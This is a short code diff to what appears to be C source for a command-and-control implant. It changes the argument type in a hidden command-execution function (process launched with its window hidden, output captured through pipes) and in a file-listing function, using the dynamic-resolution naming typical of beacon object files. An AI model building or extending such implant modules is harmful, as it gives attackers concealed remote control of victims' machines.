@@ -1,7 +1,7 @@
 ﻿#include "FuncDecl.h"
 
 // 执行 CMD 命令
-void ExecuteCmd$$(char** pCommandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID specialParaList[]) {
+void ExecuteCmd$$(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID specialParaList[]) {
     *pOutputData = (char*)MSVCRT$malloc(130);
     MSVCRT$sprintf_s(*pOutputData, 130, "%s", "[-] CMD Failed.");
     *pOutputDataLength = 15;
@@ -22,7 +22,7 @@ void ExecuteCmd$$(char** pCommandPara, int commandParaLength, char** pOutputData
     si.hStdOutput = hWrite;
     si.wShowWindow = SW_HIDE;
     si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
-    if (!Kernel32$CreateProcessA(NULL, *pCommandPara, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+    if (!Kernel32$CreateProcessA(NULL, commandPara, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
         Kernel32$CloseHandle(hRead);
         Kernel32$CloseHandle(hWrite);
         return;
@@ -44,15 +44,15 @@ void ExecuteCmd$$(char** pCommandPara, int commandParaLength, char** pOutputData
 }
 
 // 获取文件信息列表
-void GetFileInfoList$$(char** pCommandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID specialParaList[]) {
+void GetFileInfoList$$(char* commandPara, int commandParaLength, char** pOutputData, int* pOutputDataLength, PVOID specialParaList[]) {
     *pOutputData = (char*)MSVCRT$malloc(330);
     MSVCRT$sprintf_s(*pOutputData, 330, "%s", "[-] GetFileInfoList Failed.");
     *pOutputDataLength = 27;
 
     WIN32_FIND_DATAA findData;
-    HANDLE hFind = Kernel32$FindFirstFileA(*pCommandPara, &findData);
+    HANDLE hFind = Kernel32$FindFirstFileA(commandPara, &findData);
     if (hFind != INVALID_HANDLE_VALUE) {
-        if (!Kernel32$GetFullPathNameA(*pCommandPara, MAX_PATH, *pOutputData, NULL)) {
+        if (!Kernel32$GetFullPathNameA(commandPara, MAX_PATH, *pOutputData, NULL)) {
             Kernel32$FindClose(hFind);
             return;
         }
